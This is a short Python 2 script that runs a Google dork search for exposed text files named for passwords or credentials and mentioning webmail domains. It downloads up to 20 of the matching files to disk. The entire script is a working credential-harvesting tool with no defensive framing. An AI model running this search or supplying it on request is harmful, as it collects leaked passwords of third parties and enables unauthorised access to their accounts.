from google import search
import requests

for url in search("inurl:\"passes\" OR inurl:\"passwords\" OR inurl:\"credentials\" -search -download -techsupt -git -games -gz -bypass -exe filetype:txt @yahoo.com OR @gmail OR @hotmail OR @rediff", stop=20):
	try:
		filename = url.split('/')[-1]
		print 'writing %s...' %filename
		r = requests.get(url)
		with open('%s' % filename, 'wb')  as code:
			code.write(r.content)
		print 'done'
	except Exception as e:
		print e
